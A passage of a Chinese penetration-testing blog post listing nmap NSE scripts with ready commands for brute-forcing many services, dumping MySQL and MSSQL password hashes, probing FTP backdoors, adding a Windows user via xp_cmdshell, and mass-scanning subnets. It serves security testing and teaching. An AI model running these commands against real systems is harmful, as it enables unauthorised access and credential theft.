被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">21</span> –script ftp-vuln-cve2010<span class=\"number\">-4221.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 21 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">ftp-vsftpd-backdoor</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和ssh-相关的一些扫描脚本\"><a href=\"#和ssh-相关的一些扫描脚本\" class=\"headerlink\" title=\"和ssh 相关的一些扫描脚本:\"></a>和ssh 相关的一些扫描脚本:</h3><p>sshv1.nse sshv1是可以中间人的</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 22 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">sshv1</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和smtp-相关的一些扫描脚本\"><a href=\"#和smtp-相关的一些扫描脚本\" class=\"headerlink\" title=\"和smtp 相关的一些扫描脚本:\"></a>和smtp 相关的一些扫描脚本:</h3><p>smtp-brute.nse 简单爆破smtp</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 25 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">smtp-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 25 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">smtp-enum-users</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">25</span> –script smtp-vuln-cve2010<span class=\"number\">-4344.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">25</span> –script smtp-vuln-cve2011<span class=\"number\">-1720.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">25</span> –script smtp-vuln-cve2011<span class=\"number\">-1764.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和pop3-相关的一些扫描脚本\"><a href=\"#和pop3-相关的一些扫描脚本\" class=\"headerlink\" title=\"和pop3 相关的一些扫描脚本:\"></a>和pop3 相关的一些扫描脚本:</h3><p>pop3-brute.nse pop简单弱口令爆破</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 110 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">pop3-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和imap-相关的一些扫描脚本\"><a href=\"#和imap-相关的一些扫描脚本\" class=\"headerlink\" title=\"和imap 相关的一些扫描脚本:\"></a>和imap 相关的一些扫描脚本:</h3><p>imap-brute.nse imap简单弱口令爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">143</span>,<span class=\"number\">993</span> –script imap-brute.nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和dns-相关的一些漏洞扫描脚本\"><a href=\"#和dns-相关的一些漏洞扫描脚本\" class=\"headerlink\" title=\"和dns 相关的一些漏洞扫描脚本:\"></a>和dns 相关的一些漏洞扫描脚本:</h3><p>dns-zone-transfer.nse 检查目标ns服务器是否允许传送</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 53 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">dns-zone-transfer</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">53</span> –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=target.org -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p80</span> –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">hostmap-ip2hosts</span><span class=\"selector-class\">.nse</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和各种数据库相关的扫描脚本\"><a href=\"#和各种数据库相关的扫描脚本\" class=\"headerlink\" title=\"和各种数据库相关的扫描脚本:\"></a>和各种数据库相关的扫描脚本:</h3><p>informix-brute.nse informix爆破脚本</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 9088 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">informix-brute</span><span class=\"selector-class\">.nse</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>mysql-empty-password.nse mysql 扫描root空密码</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql-empty-password<span class=\"selector-class\">.nse</span> mysql 扫描root空密码</span><br></pre></td></tr></table></figure>\n<p>mysql-brute.nse mysql root弱口令简单爆破</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 3306 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">mysql-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>mysql-dump-hashes.nse 导出mysql中所有用户的hash</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">3306</span> –script mysql-dump-hashes –script-args=’username=root,password=root’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">3306</span> –script mysql-vuln-cve2012<span class=\"number\">-2122.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -<span class=\"selector-tag\">p</span> <span class=\"number\">445</span> –script ms-sql-info<span class=\"selector-class\">.nse</span> -v <span class=\"number\">203.124</span>.<span class=\"number\">11.0</span>/<span class=\"number\">24</span> ms-sql-info<span class=\"selector-class\">.nse</span> 扫描C段mssql</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-info.nse –script-args mssql.instance-port=<span class=\"number\">1433</span> -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>ms-sql-empty-password.nse 扫描mssql sa空密码</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-empty-password.nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>ms-sql-brute.nse sa弱口令爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-brute.nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p 1433 –script ms-sql-xp-cmdshell –script-<span class=\"keyword\">args</span> mssql.username=<span class=\"keyword\">sa</span>,mssql.password=<span class=\"keyword\">sa</span>,ms-sql-xp-cmdshell.cmd=“<span class=\"keyword\">net</span> user <span class=\"keyword\">test</span> <span class=\"keyword\">test</span> /add” 192.168.3.0/24</span><br></pre></td></tr></table></figure>\n<p>ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-dump-hashes -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>pgsql-brute.nse 尝试爆破postgresql</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">5432</span> –script pgsql-brute -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>oracle-brute-stealth.nse 尝试爆破oracle</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script oracle-brute-stealth -p <span class=\"number\">1521</span> –script-args oracle-brute-stealth.sid=ORCL -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>oracle-brute.nse</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script oracle-brute -p <span class=\"number\">1521</span> –script-args oracle-brute.sid=ORCL -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>mongodb-brute.nse 尝试爆破mongdb</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">27017</span> –script mongodb-brute <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>redis-brute.nse redis爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">6379</span> –script redis-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和snmp相关的一些扫描脚本\"><a href=\"#和snmp相关的一些扫描脚本\" class=\"headerlink\" title=\"和snmp相关的一些扫描脚本:\"></a>和snmp相关的一些扫描脚本:</h3><p>snmp-brute.nse 爆破C段的snmp</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sU –script snmp-brute –script-args snmp-brute.communitiesdb=user.txt <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和telnet相关的一些扫描脚本\"><a href=\"#和telnet相关的一些扫描脚本\" class=\"headerlink\" title=\"和telnet相关的一些扫描脚本:\"></a>和telnet相关的一些扫描脚本:</h3><p>telnet-brute.nse 简单爆破telnet</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">23</span> –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=<span class=\"number\">8</span>s -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和ldap服务相关的一些利用脚本\"><a href=\"#和ldap服务相关的一些利用脚本\" class=\"headerlink\" title=\"和ldap服务相关的一些利用脚本:\"></a>和ldap服务相关的一些利用脚本:</h3><p>ldap-brute.nse 简单爆破ldap</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">389</span> –script ldap-brute –script-args ldap.base=’“cn=users,dc=cqure,dc=net”‘ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和各类web中间件-web集成环境相关的一些利用脚本\"><a href=\"#和各类web中间件-web集成环境相关的一些利用脚本\" class=\"headerlink\" title=\"和各类web中间件,web集成环境相关的一些利用脚本:\"></a>和各类web中间件,web集成环境相关的一些利用脚本:</h3><p>xmpp-brute.nse xmpp爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">5222</span> –script xmpp-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-iis-short-name-brute.nse 短文件扫描</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p80 –script http-iis-short-name-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script http-iis-webdav-vuln.nse -p80,<span class=\"number\">8080</span> <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-shellshock.nse bash远程执行</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-svn-info.nse 探测目标svn</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script http-svn-info <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来</p>\n<p>http-wordpress-brute.nse</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=<span class=\"number\">3</span>,brute.firstonly=true’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-backup-finder.nse 扫描目标网站备份</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p80 –script=http-backup-finder <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-vuln-cve2015-1635.nse iis6.0远程代码执行</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"跟vpn相关的一些利用脚本\"><a href=\"#跟vpn相关的一些利用脚本\" class=\"headerlink\" title=\"跟vpn相关的一些利用脚本\"></a>跟vpn相关的一些利用脚本</h3><p>pptp-version.nse 识别目标pptp版本</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1723</span> –script pptp-version.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"smb漏洞检测脚本集\"><a href=\"#smb漏洞检测脚本集\" class=\"headerlink\" title=\"smb漏洞检测脚本集:\"></a>smb漏洞检测脚本集:</h3><ul>\n<li>smb-vuln-ms08-067.nse</li>\n<li>smb-vuln-ms10-054.nse</li>\n<li>smb-vuln-ms10-061.nse</li>\n<li>smb-vuln-ms17-010.nse smb远程执行</li>\n</ul>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p445 –script smb-vuln-ms17<span class=\"number\">-010.</span>nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"检测内网嗅探\"><a href=\"#检测内网嗅探\" class=\"headerlink\" title=\"检测内网嗅探\"></a>检测内网嗅探</h3><p>sniffer-detect.nse</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sn -Pn –script sniffer-detect.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"其它的一些辅助性脚本\"><a href=\"#其它的一些辅助性脚本\" class=\"headerlink\" title=\"其它的一些辅助性脚本:\"></a>其它的一些辅助性脚本:</h3><p>rsync-brute.nse 爆破目标的rsync</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">873</span> –script rsync-brute –script-args ‘rsync-brute.module=www’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>rlogin-brute.nse 爆破目标的rlogin</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">513</span> –script rlogin-brute <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>vnc-brute.nse 爆破目标的vnc</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script vnc-brute -p <span class=\"number\">5900</span> <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>pcanywhere-brute.nse 爆破pcanywhere</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">5631</span> –script=pcanywhere-brute <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script nessus-brute -p <span class=\"number\">1241</span> <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>nexpose-brute.nse 爆破nexpose</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script nexpose-brute -p <span class=\"number\">3780</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script shodan-api –script-args ‘shodan-api.target=<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span>/<span class=\"number\">24</span>,shodan-api.apikey=SHODANAPIKEY’</span><br></pre></td></tr></table></figure>\n<p>0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描</p>\n<p>实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-<span class=\"number\">4221.</span>nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-<span class=\"built_in\">short</span>-name-brute.nse,http-put.nse,http-php-<span class=\"keyword\">version</span>.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-<span class=\"keyword\">enum</span>.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-<span class=\"keyword\">version</span>.nse,memcached-info.nse,mongodb-info.nse,msrpc-<span class=\"keyword\">enum</span>.nse,ms-sql-info.nse,mysql-info.nse,nrpe-<span class=\"keyword\">enum</span>.nse,pptp-<span class=\"keyword\">version</span>.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-<span class=\"number\">2012</span>–<span class=\"number\">1182.</span>nse,smb-vuln-ms08-<span class=\"number\">067.</span>nse,smb-vuln-ms17-<span class=\"number\">010.</span>nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-<span class=\"keyword\">enum</span>.nse,teamspeak2-<span class=\"keyword\">version</span>.nse <span class=\"number\">192.168</span>.3.0/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>在实战中相对比较实用的nmap脚本</p>","more":"<figure class=\"highlight css\"><table><tr><td 